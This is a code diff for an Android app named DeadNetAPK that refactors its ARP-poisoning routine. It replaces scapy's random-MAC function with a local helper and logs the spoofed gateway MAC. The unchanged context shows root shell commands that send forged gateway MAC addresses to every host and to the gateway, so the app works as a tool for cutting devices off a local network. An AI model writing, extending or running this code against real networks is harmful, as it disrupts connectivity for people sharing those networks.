@@ -12,15 +12,9 @@ from kivy.logger import Logger
 
 from concurrent.futures import ThreadPoolExecutor
 from utils import *
-from scapy.all import *
 from android.permissions import request_permissions, Permission
 request_permissions([Permission.WRITE_EXTERNAL_STORAGE, Permission.INTERNET, Permission.ACCESS_WIFI_STATE,
                      Permission.ACCESS_NETWORK_STATE, Permission.ACCESS_FINE_LOCATION, Permission.CHANGE_WIFI_STATE])
-
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings
-# todo is scapy even needed anymore?
-conf.verb = 0  # scapy conf
-
 
 
 #   --------------------------------------------------------------------------------------------------------------------
@@ -85,7 +79,8 @@ class DeadNetAPK:
 
         self.gateway_ipv4 = gateway_ipv4
         self.gateway_mac = gateway_mac
-        self.gateway_mac_fake = RandMAC()
+        self.gateway_mac_fake = generate_random_mac()
+        Logger.info(f"Deadnet: Generated spoofed gateway mac {self.gateway_mac_fake}")
         if not self.gateway_mac:
             raise Exception(f"Unable to get gateway MAC address")
 
@@ -141,7 +136,7 @@ class DeadNetAPK:
         * poison every possible host with a spoofed mac address for the gateway
         """
         subprocess.Popen(
-            f"su -c {self.arp_path} {host_ip} {RandMAC()} {self.gateway_ipv4} {self.gateway_mac} {self.my_mac}",
+            f"su -c {self.arp_path} {host_ip} {generate_random_mac()} {self.gateway_ipv4} {self.gateway_mac} {self.my_mac}",
             shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         subprocess.Popen(
             f"su -c {self.arp_path} {self.gateway_ipv4} {self.gateway_mac_fake} {host_ip} ff:ff:ff:ff:ff:ff {self.my_mac}",
